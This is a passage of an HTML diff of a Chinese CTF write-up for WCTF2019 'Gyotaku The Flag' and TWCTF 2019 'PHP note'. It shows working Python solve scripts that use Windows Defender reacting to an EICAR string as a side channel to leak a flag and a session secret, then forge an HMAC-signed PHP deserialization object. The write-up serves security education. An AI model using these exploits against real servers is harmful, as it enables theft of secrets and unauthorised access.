-		// 	return c.JSON(http.StatusForbidden, &quot;this is not your gyotaku&quot;)
-		// }
-	}
+		<span style="color:#75715e">// var gyotakudata GyotakuData
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// buf := bytes.NewBuffer(data)
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// err = gob.NewDecoder(buf).Decode(&amp;gyotakudata)
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// if err != nil {
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// 	return err
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// }
+</span><span style="color:#75715e"></span>
+		<span style="color:#75715e">// if username != gyotakudata.UserName {
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// 	return c.JSON(http.StatusForbidden, &#34;this is not your gyotaku&#34;)
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// }
+</span><span style="color:#75715e"></span>	}
 }
-</code></pre>
-
-<p>至此，可以总结出以下几个要点：</p>
-
+</code></pre></div><p>至此，可以总结出以下几个要点：</p>
 <ol>
 <li>由于是 SSRF，所以能直接请求到 <code>/flag</code> 的内容</li>
 <li>请求到的内容会保存到本地，保存的结构为 <code>GyotakuData{URL: url, Data: string(body), UserName: username}</code></li>
 <li>保存到本地的内容会被读取，但无法回显给用户</li>
 </ol>
-
 <p>综合一下我们的思路，这意味着我们可能需要一种侧信道的方式来猜解 flag。</p>
-
 <p>回顾一下可以控制的变量，<code>url</code> 和 <code>username</code>，如果只要我们构造出 <code>url=/flag?a=&lt;scirpt&gt;code&lt;/script&gt;&lt;body&gt;</code>，<code>username=&lt;/body&gt;</code>，就可以构造出一个包含 flag 的文件，而该文件在被读取时可以触发 可以被 Windows Defender 的预警，利用一定的 JavaScript 代码，我们可以对 flag 进行猜解。</p>
-
 <blockquote>
 <ul>
 <li>JavaScript
-
 <ul>
 <li><code>$idx</code> and <code>$c</code> would be iterated</li>
-</ul></li>
 </ul>
-
-<pre><code class="language-javascript">&gt; var body = document.body.innerHTML;
-&gt; var mal = &quot;EICA&quot;;
-&gt; var n = body[$idx].charCodeAt(0);
-&gt; mal = mal + String.fromCharCode(n^$c);
-&gt; eval($c)
-&gt; ```
-&gt;
-&gt; - Windows Defender get angry if `$c` is appropriate
-
-### solve
-
-这里是出题人给的 solve.py，利用二分搜索加快了猜解的进度：
-
-```python
-import requests
-
-URL = &quot;http://192.168.122.78&quot; # changeme
-
-def randstr(n=8):
-    import random
-    import string
-    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
-    return ''.join([random.choice(chars) for _ in range(n)])
-
-def trigger(c, idx, sess):
-    import string
-    prefix = randstr()
-    p = prefix + '''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''
-    p = string.Template(p).substitute({'idx': idx, 'c': c})
-    req = sess.post(URL + '/gyotaku', data={'url': 'http://127.0.0.1/flag?a=' + p})
-    return req.json()
-
-def leak(idx, sess):
-    l, h = 0, 0x100
-    while h - l &gt; 1:
-        m = (h + l) // 2
-        gid = trigger(m, idx, sess)
-        if sess.get(URL + '/gyotaku/' + gid).status_code == 500:
-            l = m
-        else:
-            h = m
-    return chr(l)
-
-sess = requests.session()
-sess.post(URL + '/login', data={'username': '&lt;/body&gt;'+randstr(), 'password': randstr()})
-
-data = ''
-for i in range(30):
-    data += leak(i, sess)
-    print(data)
-
-</code></pre>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">mal</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;EICA&#34;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">body</span>[<span style="color:#a6e22e">$idx</span>].<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#a6e22e">mal</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">mal</span> <span style="color:#f92672">+</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">n</span><span style="color:#f92672">^</span><span style="color:#a6e22e">$c</span>);
+eval(<span style="color:#a6e22e">$c</span>)
+</code></pre></div><ul>
+<li>Windows Defender get angry if <code>$c</code> is appropriate</li>
+</ul>
 </blockquote>
+<h3 id="solve">solve</h3>
+<p>这里是出题人给的 solve.py，利用二分搜索加快了猜解的进度：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 
-<h2 id="php-note">PHP note</h2>
+URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.122.78&#34;</span> <span style="color:#75715e"># changeme</span>
 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">randstr</span>(n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>):
+    <span style="color:#f92672">import</span> random
+    <span style="color:#f92672">import</span> string
+    chars <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_uppercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([random<span style="color:#f92672">.</span>choice(chars) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(n)])
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger</span>(c, idx, sess):
+    <span style="color:#f92672">import</span> string
+    prefix <span style="color:#f92672">=</span> randstr()
+    p <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;&#39;&lt;script&gt;f=function(n){eval(&#39;X5O!P%@AP[4</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{${c}:&#39;*&#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;&#39;&#39;&#39;</span>
+    p <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>Template(p)<span style="color:#f92672">.</span>substitute({<span style="color:#e6db74">&#39;idx&#39;</span>: idx, <span style="color:#e6db74">&#39;c&#39;</span>: c})
+    req <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/gyotaku&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;url&#39;</span>: <span style="color:#e6db74">&#39;http://127.0.0.1/flag?a=&#39;</span> <span style="color:#f92672">+</span> p})
+    <span style="color:#66d9ef">return</span> req<span style="color:#f92672">.</span>json()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(idx, sess):
+    l, h <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100</span>
+    <span style="color:#66d9ef">while</span> h <span style="color:#f92672">-</span> l <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        m <span style="color:#f92672">=</span> (h <span style="color:#f92672">+</span> l) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+        gid <span style="color:#f92672">=</span> trigger(m, idx, sess)
+        <span style="color:#66d9ef">if</span> sess<span style="color:#f92672">.</span>get(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/gyotaku/&#39;</span> <span style="color:#f92672">+</span> gid)<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">500</span>:
+            l <span style="color:#f92672">=</span> m
+        <span style="color:#66d9ef">else</span>:
+            h <span style="color:#f92672">=</span> m
+    <span style="color:#66d9ef">return</span> chr(l)
+
+sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+sess<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/login&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;&lt;/body&gt;&#39;</span><span style="color:#f92672">+</span>randstr(), <span style="color:#e6db74">&#39;password&#39;</span>: randstr()})
+
+data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>):
+    data <span style="color:#f92672">+=</span> leak(i, sess)
+    <span style="color:#66d9ef">print</span>(data)
+
+</code></pre></div><h2 id="php-note">PHP note</h2>
 <p>题目直接给出了源码：</p>
-
-<pre><code class="language-php+HTML">&lt;?php
+<pre><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
 include 'config.php';
 
 class Note {
@@ -662,90 +593,73 @@ if ($action === 'getflag') {
         &lt;/script&gt;
     &lt;/body&gt;
 &lt;/html&gt;
-</code></pre>
-
-<p>可以看到是一个很正常的反序列化的题目，但由于不知道 <code>$_SESSION['secret']</code> 的值，构造后的反序列化对象无法通过 <code>hmac</code> 验证。因此，解题的第一步需要猜解出 <code>$_SESSION['secret']</code>。</p>
-
+</code></pre><p>可以看到是一个很正常的反序列化的题目，但由于不知道 <code>$_SESSION['secret']</code> 的值，构造后的反序列化对象无法通过 <code>hmac</code> 验证。因此，解题的第一步需要猜解出 <code>$_SESSION['secret']</code>。</p>
 <p>查看 HTTP 请求的 header，可以发现相应的 server 是一台 Windows：</p>
-
 <pre><code>Content-Length: 27171
 Content-Type: text/html; charset=UTF-8
 Date: Thu, 05 Sep 2019 14:16:31 GMT
 Server: Microsoft-IIS/10.0
 X-Powered-By: PHP/7.3.9
-</code></pre>
-
-<p>那么很自然的考虑利用 Windows Defender 来进行侧信道。考虑到 PHP 的 session 本质上也是存储在 server 上的文件，那么可以利用创建一个恶意 session 文件的方式来触发 Windows Defender。</p>
-
+</code></pre><p>那么很自然的考虑利用 Windows Defender 来进行侧信道。考虑到 PHP 的 session 本质上也是存储在 server 上的文件，那么可以利用创建一个恶意 session 文件的方式来触发 Windows Defender。</p>
 <p>注意到由于复制顺序的问题，我们需要两次调用 <code>/login</code> 来构造一个符合 HTML 格式的 session 文件，以下是在 Linux 上的模拟，不要在意真题环境是 Windows 这种事情（逃：</p>
-
-<pre><code class="language-shell">$ sudo cat sess_i4m4pdr67l20ar8i6777av24s7
-realname|s:209:&quot;--!&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{0:'*'}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&quot;;secret|s:32:&quot;8b9a527ff677cb223afa87dad7c9e6f8&quot;;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo cat sess_i4m4pdr67l20ar8i6777av24s7
+realname|s:209:<span style="color:#e6db74">&#34;--!&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}</span>$$<span style="color:#e6db74">EICAR-STANDARD-ANTIVIRUS-TEST-FILE!</span>$$<span style="color:#e6db74">H+H&#39;+{0:&#39;*&#39;}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&#34;</span>;secret|s:32:<span style="color:#e6db74">&#34;8b9a527ff677cb223afa87dad7c9e6f8&#34;</span>;
 $ sudo cat sess_i4m4pdr67l20ar8i6777av24s7
-realname|s:209:&quot;--!&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{0:'*'}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&quot;;secret|s:32:&quot;121cc233a4700baca86ab6a6fa3f2d50&quot;;nickname|s:8:&quot;1&lt;/body&gt;&quot;;
-</code></pre>
+realname|s:209:<span style="color:#e6db74">&#34;--!&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}</span>$$<span style="color:#e6db74">EICAR-STANDARD-ANTIVIRUS-TEST-FILE!</span>$$<span style="color:#e6db74">H+H&#39;+{0:&#39;*&#39;}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&#34;</span>;secret|s:32:<span style="color:#e6db74">&#34;121cc233a4700baca86ab6a6fa3f2d50&#34;</span>;nickname|s:8:<span style="color:#e6db74">&#34;1&lt;/body&gt;&#34;</span>;
+</code></pre></div><p>修改脚本：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> requests
 
-<p>修改脚本：</p>
+URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://phpnote.chal.ctf.westerns.tokyo/?action={}&#34;</span>
 
-<pre><code class="language-python">import random
-import string
-import requests
-
-URL = &quot;http://phpnote.chal.ctf.westerns.tokyo/?action={}&quot;
-
-def trigger(c, idx):
-    sess = requests.session()
-    payload = '''&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;'''
-    payload = string.Template(payload).substitute({'idx': idx, 'c': c})
-    sess.post(URL.format('login'), data={
-        'realname': payload 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger</span>(c, idx):
+    sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval(&#39;X5O!P%@AP[4</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{${c}:&#39;*&#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&#39;&#39;&#39;</span>
+    payload <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>Template(payload)<span style="color:#f92672">.</span>substitute({<span style="color:#e6db74">&#39;idx&#39;</span>: idx, <span style="color:#e6db74">&#39;c&#39;</span>: c})
+    sess<span style="color:#f92672">.</span>post(URL<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#39;login&#39;</span>), data<span style="color:#f92672">=</span>{
+        <span style="color:#e6db74">&#39;realname&#39;</span>: payload 
     })
-    sess.post(URL.format('login'), data={
-        'nickname': '1&lt;/body&gt;',
-        'realname': payload 
+    sess<span style="color:#f92672">.</span>post(URL<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#39;login&#39;</span>), data<span style="color:#f92672">=</span>{
+        <span style="color:#e6db74">&#39;nickname&#39;</span>: <span style="color:#e6db74">&#39;1&lt;/body&gt;&#39;</span>,
+        <span style="color:#e6db74">&#39;realname&#39;</span>: payload 
     })
-    res = sess.get(URL.format('index'))
-    return 'Login' in res.text
+    res <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>get(URL<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#39;index&#39;</span>))
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Login&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text
 
-def leak(idx):
-    l, h = 0, 0x100
-    while h - l &gt; 1:
-        m = (h + l) // 2
-        if trigger(m, idx):
-            l = m
-        else:
-            h = m
-    return chr(l)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(idx):
+    l, h <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100</span>
+    <span style="color:#66d9ef">while</span> h <span style="color:#f92672">-</span> l <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        m <span style="color:#f92672">=</span> (h <span style="color:#f92672">+</span> l) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+        <span style="color:#66d9ef">if</span> trigger(m, idx):
+            l <span style="color:#f92672">=</span> m
+        <span style="color:#66d9ef">else</span>:
+            h <span style="color:#f92672">=</span> m
+    <span style="color:#66d9ef">return</span> chr(l)
 
-data = ''
-for i in range(60):
-    data += leak(i)
-    print(data)
+data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">60</span>):
+    data <span style="color:#f92672">+=</span> leak(i)
+    <span style="color:#66d9ef">print</span>(data)
 
-</code></pre>
-
-<p>泄露出 secret 后构造反序列化对象：</p>
-
-<pre><code class="language-php">$secret = &quot;7daeeed052fd2908fb30f462ad1c7936&quot;;
+</code></pre></div><p>泄露出 secret 后构造反序列化对象：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$secret = &#34;7daeeed052fd2908fb30f462ad1c7936&#34;;
 $note = new Note(true);
-$note-&gt;addnote(&quot;exploit&quot;,&quot;works&quot;);
+$note-&gt;addnote(&#34;exploit&#34;,&#34;works&#34;);
 $obj = base64_encode(serialize($note));
-print_r($obj.&quot;\n&quot;);
+print_r($obj.&#34;\n&#34;);
 print_r(hmac($obj, $secret));
-</code></pre>
-
-<p>获得 flag：<code>TWCTF{h0pefully_I_haven't_made_a_m1stake_again}</code></p>
-
+</code></pre></div><p>获得 flag：<code>TWCTF{h0pefully_I_haven't_made_a_m1stake_again}</code></p>
 <h2 id="总结">总结</h2>
-
 <p>很多情况下漏洞不等价于 RCE，而在于我们是否能从不同的维度对一个功能进行探索，以上。</p>
-
 <h2 id="参考链接">参考链接</h2>
-
 <ul>
-<li><p><a href="https://n0b0dycn.me/2019/08/playing-with-windows-defender/" rel="nofollow noreferrer" target="_blank">Playing with Windows Defender</a></p></li>
-
-<li><p><a href="https://github.com/icchy/wctf2019-gtf/blob/master/wctf2019-gtf-slides.pdf" rel="nofollow noreferrer" target="_blank">WCTF2019: Gyotaku The Flag</a></p></li>
+<li>
+<p><a href="https://n0b0dycn.me/2019/08/playing-with-windows-defender/">Playing with Windows Defender</a></p>
+</li>
+<li>
+<p><a href="https://github.com/icchy/wctf2019-gtf/blob/master/wctf2019-gtf-slides.pdf">WCTF2019: Gyotaku The Flag</a></p>
+</li>
 </ul>
 
     </div>
